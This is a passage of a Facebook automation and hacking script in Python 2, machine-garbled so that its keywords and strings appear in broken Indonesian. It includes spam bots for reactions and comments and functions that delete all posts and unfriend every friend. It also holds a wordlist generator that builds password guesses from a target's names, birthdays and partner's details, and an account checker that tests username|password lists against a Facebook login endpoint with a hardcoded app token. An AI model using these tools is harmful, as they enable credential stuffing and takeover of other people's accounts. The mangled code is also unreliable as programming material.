        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        ide  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mID Grup \ x1b [1; 91m: \ x1b [1; 97m' )
        limit  =  raw_input ( ' \ x1b [1; 91m [!] \ x1b [1; 92mLimit \ x1b [1; 91m: \ x1b [1; 97m' )
        ah  =  permintaan . dapatkan ( 'https://graph.facebook.com/group/?id='  +  ide  +  '& access_token ='  +  toket )
        asw  =  json . memuat ( teks . ah )
        cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mNama grup \ x1b [1; 91m: \ x1b [1; 97m'  +  asw [ 'name' ]
        coba :
            oh  =  permintaan . dapatkan ( 'https://graph.facebook.com/v3.0/'  +  ide  +  '? bidang = feed.limit ('  +  limit  +  ') & access_token ='  +  toket )
            ah  =  json . memuat ( oh . teks )
            jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            untuk  sebuah  di  ah [ 'pakan' ] [ 'data' ]:
                y  =  a [ 'id' ]
                reaksigrup . tambahkan ( y )
                permintaan . pos ( 'https://graph.facebook.com/'  +  y  +  '/ reaksi? type ='  +  tipe  +  '& access_token ='  +  toket )
                cetak  ' \ x1b [1; 92m [ \ x1b [1; 97m'  +  y [: 10 ]. ganti ( ' \ n ' , '' ) +  '... \ x1b [1; 92m] \ x1b [1; 97m'  +  tipe

            mencetak
            cetak  ' \ r \ x1b [1; 91m [+] \ x1b [1; 97m Selesai \ x1b [1; 96m'  +  str ( len ( reaksigrup ))
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            menu_bot ()
        kecuali  KeyError :
            cetak  ' \ x1b [1; 91m [!] ID tidak ditemukan'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            menu_bot ()


def  bot_komen ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()
    lain :
        os . sistem ( 'jelas' )
        cetak  logo
        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        cetak  " \ x1b [1; 91m [!] \ x1b [1; 92mGunakan \ x1b [1; 97m '<>' \ x1b [1; 92m untuk baris baru"
        ide  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mID Target \ x1b [1; 91m: \ x1b [1; 97m' )
        km  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mComments   \ x1b [1; 91m: \ x1b [1; 97m' )
        limit  =  raw_input ( ' \ x1b [1; 91m [!] \ x1b [1; 92mLimit \ x1b [1; 91m: \ x1b [1; 97m' )
        km  =  km . ganti ( '<>' , ' \ n ' )
        coba :
            p  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  ide  +  '? bidang = feed.limit ('  +  limit  +  ') & access_token ='  +  toket )
            a  =  json . memuat ( hal . teks )
            jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            untuk  s  di  sebuah [ 'pakan' ] [ 'data' ]:
                f  =  s [ 'id' ]
                Komen . tambahkan ( f )
                permintaan . kirim ( 'https://graph.facebook.com/'  +  f  +  '/ comments? message ='  +  km  +  '& access_token ='  +  toket )
                cetak  ' \ x1b [1; 92m [ \ x1b [1; 97m'  +  km [: 10 ]. ganti ( ' \ n ' , '' ) +  '... \ x1b [1; 92m]'

            mencetak
            cetak  ' \ r \ x1b [1; 91m [+] \ x1b [1; 97m Selesai \ x1b [1; 96m'  +  str ( len ( komen ))
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            menu_bot ()
        kecuali  KeyError :
            cetak  ' \ x1b [1; 91m [!] ID tidak ditemukan'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            menu_bot ()


def  grup_komen ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()
    lain :
        os . sistem ( 'jelas' )
        cetak  logo
        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        cetak  " \ x1b [1; 91m [!] \ x1b [1; 92mGunakan \ x1b [1; 97m '<>' \ x1b [1; 92mUntuk Baris Baru"
        ide  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mID Grup   \ x1b [1; 91m: \ x1b [1; 97m' )
        km  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mComments \ x1b [1; 91m: \ x1b [1; 97m' )
        limit  =  raw_input ( ' \ x1b [1; 91m [!] \ x1b [1; 92mLimit \ x1b [1; 91m: \ x1b [1; 97m' )
        km  =  km . ganti ( '<>' , ' \ n ' )
        coba :
            ah  =  permintaan . dapatkan ( 'https://graph.facebook.com/group/?id='  +  ide  +  '& access_token ='  +  toket )
            asw  =  json . memuat ( teks . ah )
            cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName grup \ x1b [1; 91m: \ x1b [1; 97m'  +  asw [ 'name' ]
            p  =  permintaan . dapatkan ( 'https://graph.facebook.com/v3.0/'  +  ide  +  '? bidang = feed.limit ('  +  limit  +  ') & access_token ='  +  toket )
            a  =  json . memuat ( hal . teks )
            jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            untuk  s  di  sebuah [ 'pakan' ] [ 'data' ]:
                f  =  s [ 'id' ]
                komengrup . tambahkan ( f )
                permintaan . kirim ( 'https://graph.facebook.com/'  +  f  +  '/ comments? message ='  +  km  +  '& access_token ='  +  toket )
                cetak  ' \ x1b [1; 92m [ \ x1b [1; 97m'  +  km [: 10 ]. ganti ( ' \ n ' , '' ) +  '... \ x1b [1; 92m]'

            mencetak
            cetak  ' \ r \ x1b [1; 91m [+] \ x1b [1; 97m Selesai \ x1b [1; 96m'  +  str ( len ( komengrup ))
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            menu_bot ()
        kecuali  KeyError :
            cetak  ' \ x1b [1; 91m [!] ID tidak ditemukan'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            menu_bot ()


def  deletepost ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
        nam  =  permintaan . dapatkan ( 'https://graph.facebook.com/me?access_token='  +  toket )
        lol  =  json . memuat ( nam . teks )
        nama  =  lol [ 'name' ]
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()

    os . sistem ( 'jelas' )
    cetak  logo
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mDari \ x1b [1; 91m: \ x1b [1; 97m% s'  %  nama
    jalan ( ' \ x1b [1; 91m [+] \ x1b [1; 92m Mulai menghapus status \ x1b [1; 97m ...' )
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    asu  =  permintaan . dapatkan ( 'https://graph.facebook.com/me/feed?access_token='  +  toket )
    asus  =  json . beban ( asu . teks )
    untuk  p  dalam  asus [ 'data' ]:
        id  =  p [ 'id' ]
        piro  =  0
        url  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  id  +  '? method = delete & access_token ='  +  toket )
        ok  =  json . memuat ( url . teks )
        coba :
            error  =  ok [ 'error' ] [ 'message' ]
            cetak  ' \ x1b [1; 91m [ \ x1b [1; 97m'  +  id [: 10 ]. ganti ( ' \ n ' , '' ) +  '...'  +  ' \ x1b [1; 91m] \ x1b [1; 95m Gagal'
        kecuali  TypeError :
            cetak  ' \ x1b [1; 92m [ \ x1b [1; 97m'  +  id [: 10 ]. ganti ( ' \ n ' , '' ) +  '...'  +  ' \ x1b [1; 92m] \ x1b [1; 96mRemoved'
            piro  + =  1
        kecuali  permintaan . pengecualian . ConnectionError :
            cetak  ' \ x1b [1; 91m [!] Kesalahan Koneksi'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            menu_bot ()

    cetak  ' \ n \ x1b [1; 91m [+] \ x1b [1; 97mFinish'
    raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
    menu_bot ()


def  accept ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()

    os . sistem ( 'jelas' )
    cetak  logo
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    limit  =  raw_input ( ' \ x1b [1; 91m [!] \ x1b [1; 92mLimit \ x1b [1; 91m: \ x1b [1; 97m' )
    r  =  permintaan . dapatkan ( 'https://graph.facebook.com/me/friendrequests?limit='  +  limit  +  '& access_token ='  +  toket )
    teman  =  json . memuat ( r . teks )
    jika  '[]'  di  str ( teman [ 'data' ]):
        cetak  ' \ x1b [1; 91m [!] Tidak ada permintaan teman'
        raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
        menu_bot ()
    jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    untuk  saya  di  teman [ 'data' ]:
        gas  =  permintaan . posting ( 'https://graph.facebook.com/me/friends/'  +  i [ 'from' ] [ 'id' ] +  '? access_token ='  +  toket )
        a  =  json . memuat ( gas . teks )
        jika  'kesalahan'  dalam  str ( a ):
            cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mName   \ x1b [1; 91m: \ x1b [1; 97m'  +  i [ 'from' ] [ 'name' ]
            cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mID     \ x1b [1; 91m: \ x1b [1; 97m'  +  i [ 'from' ] [ 'id' ] +  ' \ x1b [1; 91 m Gagal '
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        lain :
            cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mName   \ x1b [1; 91m: \ x1b [1; 97m'  +  i [ 'from' ] [ 'name' ]
            cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mID     \ x1b [1; 91m: \ x1b [1; 97m'  +  i [ 'from' ] [ 'id' ] +  ' \ x1b [1; 92m Berhasil '
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '

    cetak  ' \ n \ x1b [1; 91m [+] \ x1b [1; 97mFinish'
    raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
    menu_bot ()


def  unfriend ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()
    lain :
        os . sistem ( 'jelas' )
        cetak  logo
        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        cetak  ' \ x1b [1; 97mStop \ x1b [1; 91mCTRL + C'
        mencetak
        coba :
            pek  =  permintaan . dapatkan ( 'https://graph.facebook.com/me/friends?access_token='  +  toket )
            cok  =  json . memuat ( pek . teks )
            untuk  saya  di  cok [ 'data' ]:
                nama  =  i [ 'name' ]
                id  =  i [ 'id' ]
                permintaan . hapus ( 'https://graph.facebook.com/me/friends?uid='  +  id  +  '& access_token ='  +  toket )
                cetak  ' \ x1b [1; 97m [ \ x1b [1; 92mHapus \ x1b [1; 97m]'  +  nama  +  '=>'  +  id

        kecuali  IndexError :
            lulus
        kecuali  KeyboardInterrupt :
            cetak  ' \ x1b [1; 91m [!] Berhenti'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            menu_bot ()

    cetak  ' \ n \ x1b [1; 91m [+] \ x1b [1; 97mFinish'
    raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
    menu_bot ()


def  lain ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()

    os . sistem ( 'jelas' )
    cetak  logo
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    cetak  '║-> \ x1b [1; 37; 40m1. Tulis Status '
    cetak  '║-> \ x1b [1; 37; 40m2. Buat Daftar Kata '
    cetak  '║-> \ x1b [1; 37; 40m3. Pemeriksa Akun
    cetak  '║-> \ x1b [1; 37; 40m4. Daftar Grup
    cetak  '║-> \ x1b [1; 37; 40m5. Pelindung Profil '
    cetak  '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak  ' \ x1b [1; 37; 40m║'
    pilih_lain ()


def  pilih_lain ():
    lainnya  =  raw_input ( '╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m' )
    jika  lainnya  ==  '' :
        mencetak  ' \ x1b [1;! 91m [] Can \' t kosong'
        pilih_lain ()
    lain :
        jika  lainnya  ==  '1' :
            status ()
        lain :
            jika  lainnya  ==  '2' :
                daftar kata ()
            lain :
                jika  lainnya  ==  '3' :
                    check_akun ()
                lain :
                    jika  lainnya  ==  '4' :
                        grupsaya ()
                    lain :
                        jika  lainnya  ==  '5' :
                            penjaga ()
                        lain :
                            jika  lainnya  ==  '0' :
                                menu ()
                            lain :
                                cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] \ x1b [1; 97m'  +  lainnya  +  ' \ x1b [1; 91 tidak ditemukan'
                                pilih_lain ()


 status def ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()

    os . sistem ( 'jelas' )
    cetak  logo
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    msg  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92m Status penulisan \ x1b [1; 91m: \ x1b [1; 97m' )
    jika  msg  ==  '' :
        mencetak  ' \ x1b [1;! 91m [] Can \' t kosong'
        raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
        lain ()
    lain :
        res  =  permintaan . dapatkan ( 'https://graph.facebook.com/me/feed?method=POST&message='  +  msg  +  '& access_token ='  +  toket )
        op  =  json . memuat ( res . teks )
        jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mStatus ID \ x1b [1; 91m: \ x1b [1; 97m'  +  op [ 'id' ]
        raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
        lain ()


def  wordlist ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()
    lain :
        coba :
            os . sistem ( 'jelas' )
            cetak  logo
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            cetak  ' \ x1b [1; 91m [?] \ x1b [1; 92mIsi data lengkap target di bawah'
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            a  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mName Depan \ x1b [1; 97m:' )
            file  =  terbuka ( a  +  '.txt' , 'w' )
            b  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mName Tengah \ x1b [1; 97m:' )
            c  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mName Belakang \ x1b [1; 97m:' )
            d  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mName Panggilan \ x1b [1; 97m:' )
            e  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mTanggal Lahir> \ x1b [1; 96mex: | DDMMYY | \ x1b [1; 97m:' )
            f  =  e [ 0 : 2 ]
            g  =  e [ 2 : 4 ]
            h  =  e [ 4 :]
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            cetak  ' \ x1b [1; 91m [?] \ x1b [1; 93mKalo Jomblo SKIP aja: v'
            i  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mName Pacar \ x1b [1; 97m:' )
            j  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mName Panggilan Pacar \ x1b [1; 97m:' )
            k  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mTanggal Lahir Pacar> \ x1b [1; 96mex: | DDMMYY | \ x1b [1; 97m:' )
            jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
            l  =  k [ 0 : 2 ]
            m  =  k [ 2 : 4 ]
            n  =  k [ 4 :]
            file . tulis ( '% s% s \ n % s% s% s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ s n % s% s\ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s % s \ n % s % s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s% s% s% s% s \ n % s % s% s \ n % s% s \ n% s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s % s \ n % s % s% s \ n % s% s% s \ n % s% s% s \ n % s% s% s \ n % s% s% s \ n % s% s% s \ n % s% s % s \ n % s% s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s % s \ n % s % s \ n % s% s \ n % s% s \ n % s% s \ n% s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s % s \ n % s % s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s \ n % s% s% s \ n % s% s \ n % s% s \ n % s% s '  % ( a , c , a , b , b , a , b ,c , c , a , c , b , a , a , b , b , c , c , a , d , b , d , c , d , d , d , d , a , d , b , d , c , a , e , a , f , a, g , a , h , b , e , b , f , b , g , b , h , c , e , c , f , c , g , c , h , d , e , d , f , d , f , d , g , d , h , e , a ,f , a , g , a , h , a , e , b , f , b , g , b , h , b , e , c , f , c , g , c , h , c , e , d , f , d , g , d , h , d, D , d , a , f , g , a , g , h , f , g , f , h , f , f , g , f , g , h , g , g , h , f , h , g , h , h , h , g , f ,a , g , h , b , f , g , b , g , h , c , f , g , c , g , h , d , f , g , d , g , h , a , i , a , j , a , k , i , e , i, j , i , k , b , i , b , j , b , k , c , i , c , j , c , k , e , k , j , a , j , b , j , b , j , c , j , d , j , j , k , a ,k , b , k , c , k , d , k , k , i , l , i , m , i , n , j , l , j , m , j , n , j , k ))
            wg  =  0
            sementara  wg  <  100 :
                wg  =  wg  +  1
                file . tulis ( a  +  str ( wg ) +  ' \ n ' )

            id  =  0
            sementara  en  <  100 :
                id  =  en  +  1
                file . tulis ( i  +  str ( en ) +  ' \ n ' )

            kata  =  0
            sementara  kata  <  100 :
                kata  =  kata  +  1
                file . tulis ( d  +  str ( kata ) +  ' \ n ' )

            gen  =  0
            sedangkan  gen  <  100 :
                gen  =  gen  +  1
                file . tulis ( j  +  str ( gen ) +  ' \ n ' )

            file . tutup ()
            waktu . tidur ( 1.5 )
            cetak  ' \ n \ x1b [1; 91m [+] \ x1b [1; 97mSimpan \ x1b [1; 91m: \ x1b [1; 97m% s.txt'  %  a
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            lain ()
        kecuali  IOError  sebagai  e :
            cetak  ' \ x1b [1; 91m [!] Jadikan file gagal'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            lain ()


def  check_akun ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()
    lain :
        os . sistem ( 'jelas' )
        cetak  logo
        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        cetak  ' \ x1b [1; 91m [?] \ x1b [1; 92mIsi File \ x1b [1; 91m: \ x1b [1; 97musername | password'
        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        live  = []
        cek  = []
        die  = []
        coba :
            file  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mFile \ x1b [1; 91m: \ x1b [1; 97m' )
            list  =  open ( file , 'r' ). readlines ()
        kecuali  IOError :
            cetak  ' \ x1b [1; 91m [!] File tidak ditemukan'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            lain ()

    pemisah  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mSeparator \ x1b [1; 91m: \ x1b [1; 97m' )
    jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    untuk  meki  dalam  daftar :
        nama pengguna , kata sandi  =  meki . strip (). split ( str ( pemisah ))
        url  =  'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='  +  nama  +  '& locale = en_US & password ='  +  kata sandi  +  '& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 '
        data  =  permintaan . dapatkan ( url )
        mpsh  =  json . memuat ( data . teks )
        jika  'access_token'  di  mpsh :
            hidup . tambahkan ( kata sandi )
            cetak  ' \ x1b [1; 97m [ \ x1b [1; 92mLive \ x1b [1; 97m]   \ x1b [1; 97m'  +  nama pengguna  +  '| '  +  kata sandi
        elif  'www.facebook.com'  di  mpsh [ 'error_msg' ]:
            cek . tambahkan ( kata sandi )
            cetak  ' \ x1b [1; 97m [ \ x1b [1; 93mPeriksa \ x1b [1; 97m] \ x1b [1; 97m'  +  nama pengguna  +  '| '  +  kata sandi
        lain :
            mati . tambahkan ( kata sandi )
            cetak  ' \ x1b [1; 97m [ \ x1b [1; 91mDie \ x1b [1; 97m]   \ x1b [1; 97m'  +  nama pengguna  +  '| '  +  kata sandi

    cetak  ' \ n \ x1b [1; 91m [+] \ x1b [1; 97mTotal \ x1b [1; 91m: \ x1b [1; 97mLive = \ x1b [1; 92m'  +  str ( len ( live )) +  ' \ x1b [1; 97mCheck = \ x1b [1; 93m '  +  str ( len ( cek )) +  ' \ x1b [1; 97mDie = \ x1b [1; 91m '  +  str ( len ( die ))
    raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
    lain ()


def  grupsaya ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()
    lain :
        os . sistem ( 'jelas' )
        cetak  logo
        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        coba :
            uh  =  permintaan . dapatkan ( 'https://graph.facebook.com/me/groups?access_token='  +  toket )
            gud  =  json . memuat ( eh . teks )
            untuk  p  in  gud [ 'data' ]:
                nama  =  p [ 'name' ]
                id  =  p [ 'id' ]
                f  =  buka ( 'grupid.txt' , 'w' )
                listgrup . tambahkan ( id )
                f . tulis ( id  +  ' \ n ' )
                cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName   \ x1b [1; 91m: \ x1b [1; 97m'  +  str ( nama )
                cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mID     \ x1b [1; 91m: \ x1b [1; 97m'  +  str ( id )
                cetak  52  *  ' \ x1b [1; 97m ='

            cetak  ' \ n \ r \ x1b [1; 91m [+] \ x1b [1; 97mTotal Grup \ x1b [1; 96m% s'  %  len ( listgrup )
            cetak  ' \ x1b [1; 91m [+] \ x1b [1; 97mSimpan \ x1b [1; 91m: \ x1b [1; 97mgrupid.txt'
            f . tutup ()
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            lain ()
        kecuali ( KeyboardInterrupt , EOFError ):
            cetak  ' \ x1b [1; 91m [!] Berhenti'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            lain ()
        kecuali  KeyError :
            os . hapus ( 'grupid.txt' )
            cetak  ' \ x1b [1; 91m [!] Grup tidak ditemukan'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            lain ()
        kecuali  permintaan . pengecualian . ConnectionError :
            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] Tidak ada koneksi'
            keluar ()
        kecuali  IOError :
            cetak  ' \ x1b [1; 91m [!] Kesalahan saat membuat file'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            lain ()


def  guard ():
     toket global
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()

    os . sistem ( 'jelas' )
    cetak  logo
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    cetak  '║-> \ x1b [1; 37; 40m1. Memungkinkan'
    cetak  '║-> \ x1b [1; 37; 40m2. Nonaktifkan '
    cetak  '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak  ' \ x1b [1; 37; 40m║'
    g  =  raw_input ( '╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m' )
    jika  g  ==  '1' :
        aktif  =  'true'
        gaz ( toket , aktif )
    lain :
        jika  g  ==  '2' :
            non  =  'false'
            gaz ( toket , non )
        lain :
            jika  g  ==  '0' :
                lain ()
            lain :
                jika  g  ==  '' :
                    keluar ()
                lain :
                    keluar ()


def  get_userid ( toket ):
    url  =  'https://graph.facebook.com/me?access_token=%s'  toket % 
    res  =  permintaan . dapatkan ( url )
    uid  =  json . memuat ( res . teks )
    kembalikan  uid [ 'id' ]


def  gaz ( toket , aktifkan = Benar ):
    id  =  get_userid ( toket )
